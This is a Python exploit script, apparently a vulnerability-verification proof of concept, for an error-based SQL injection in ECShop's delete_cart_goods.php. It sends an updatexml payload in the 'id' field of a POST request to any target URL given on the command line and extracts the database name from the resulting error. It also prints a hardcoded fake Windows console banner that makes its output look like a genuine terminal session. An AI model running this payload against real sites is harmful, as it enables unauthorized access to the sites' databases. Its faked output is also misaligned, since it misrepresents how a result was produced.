#!/usr/bin/env python3
#-*- coding: utf-8 -*-
#author: myh0st@xazlsec


import requests
import urllib3
import sys
import json
import re

urllib3.disable_warnings()

def verify(site):
    burp0_url = site + "/delete_cart_goods.php"
    burp0_headers = {"Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.93 Safari/537.36"}
    burp0_data = {"id": "0||(updatexml(1,concat(0x7e,(select database()),0x7e),1))"}
    r = requests.post(burp0_url, headers=burp0_headers, data=burp0_data, verify=False)
    if "XPATH" in r.text:
        info = re.findall("'~([^']+)~'", r.text)
        if len(info) != 0:
            return info[0]
    return ""

if __name__=="__main__":
    target = sys.argv[1]
    print("Microsoft Windows [版本 10.0.19044.3086]\n(c) Microsoft Corporation。保留所有权利。\n\nD:\VulnSubmit\script>python3 ecshop_sql.py ",target)
    info = verify(target)
    if info != "":
        print("[+]漏洞存在，执行paylaod updatexml(1,concat(0x7e,(select%20database()),0x7e),1) 结果为：", info)
    else:
        print("[-]漏洞不存在")
